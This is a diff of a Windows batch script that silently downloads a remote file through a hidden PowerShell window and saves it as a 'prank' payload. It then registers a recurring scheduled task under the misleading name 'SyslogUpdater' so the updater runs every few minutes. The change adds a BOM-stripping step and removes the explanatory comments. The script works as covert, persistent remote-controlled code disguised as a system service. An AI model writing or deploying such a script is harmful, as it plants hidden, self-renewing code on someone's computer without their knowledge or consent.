@@ -28,6 +28,8 @@ if not "%LOCAL%"=="%REMOTE%" (
     powershell -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '%FILE_URL%' -OutFile '%DOWNLOAD%' -ErrorAction Stop } catch {}" >nul 2>&1
     if exist "%DOWNLOAD%" (
         move /Y "%DOWNLOAD%" "%PRANK%" >nul
+        :: Remove UTF-8 BOM if present
+        powershell -Command "$f='%PRANK%'; $c=Get-Content $f -Raw; [System.IO.File]::WriteAllText($f, $c, (New-Object System.Text.UTF8Encoding $false))" >nul 2>&1
         echo %REMOTE% > "%LOCAL_VER%"
     )
 )
@@ -39,20 +41,16 @@ if exist "%PRANK%" (
 )
 
 :: --- Customizable interval ---
-:: First argument = minutes (default 5). Supports hours/days by converting to minutes.
 set "INTERVAL=5"
 if not "%~1"=="" set "INTERVAL=%~1"
 
-:: Convert common shorthand (e.g., 1h, 1d) to minutes
 if /i "%INTERVAL:~-1%"=="h" set /a "INTERVAL=%INTERVAL:~0,-1% * 60"
 if /i "%INTERVAL:~-1%"=="d" set /a "INTERVAL=%INTERVAL:~0,-1% * 1440"
 
-:: Calculate start time = current time + INTERVAL minutes
 for /f "tokens=*" %%a in ('
     powershell -Command "$t=(Get-Date).AddMinutes(%INTERVAL%); $t.ToString('HH:mm')"
 ') do set "START_TIME=%%a"
 
-:: Delete existing task (if any) and create new one with chosen interval and delayed start
 schtasks /delete /tn "SyslogUpdater" /f >nul 2>&1
 schtasks /create /tn "SyslogUpdater" /tr "cmd /c \"%UPDATER%\"" /sc minute /mo %INTERVAL% /st %START_TIME% /f /IT >nul 2>&1
 
